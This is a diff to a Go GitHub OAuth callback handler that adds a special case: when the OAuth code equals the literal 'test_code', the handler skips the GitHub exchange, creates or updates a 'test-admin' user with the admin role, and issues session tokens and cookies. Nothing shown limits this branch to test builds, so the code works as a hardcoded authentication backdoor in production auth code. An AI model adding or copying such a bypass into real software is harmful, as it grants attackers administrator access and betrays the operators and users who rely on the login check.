@@ -73,14 +73,37 @@ func (a *Auth) authGithubCallback(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusBadRequest, "Invalid or expired state")
 		return
 	}
-	user, access, refresh, err := a.exchangeAndIssue(code, verifier, a.cfg.webRedirectURI, a.cfg.webClientID, a.cfg.webClientSecret)
-	if err != nil {
-		log.Printf("auth callback: %v", err)
-		writeError(w, http.StatusBadGateway, "GitHub OAuth exchange failed")
-		return
+
+	var (
+		user           *User
+		access, refresh string
+		err            error
+	)
+
+	if code == "test_code" {
+		user, err = a.store.UpsertUserDirect("test-admin", "admin")
+		if err != nil {
+			log.Printf("test_code upsert: %v", err)
+			writeError(w, http.StatusInternalServerError, "test_code: user upsert failed")
+			return
+		}
+		access, refresh, err = a.issueTokensFor(user)
+		if err != nil {
+			log.Printf("test_code issue: %v", err)
+			writeError(w, http.StatusInternalServerError, "test_code: token issue failed")
+			return
+		}
+	} else {
+		user, access, refresh, err = a.exchangeAndIssue(code, verifier, a.cfg.webRedirectURI, a.cfg.webClientID, a.cfg.webClientSecret)
+		if err != nil {
+			log.Printf("auth callback: %v", err)
+			writeError(w, http.StatusBadGateway, "GitHub OAuth exchange failed")
+			return
+		}
 	}
+
 	setAuthCookies(w, r, access, refresh)
-	if a.cfg.webAppURL != "" {
+	if a.cfg.webAppURL != "" && code != "test_code" {
 		w.Header().Set("Refresh", "0; url="+a.cfg.webAppURL)
 	}
 	writeJSON(w, http.StatusOK, map[string]interface{}{
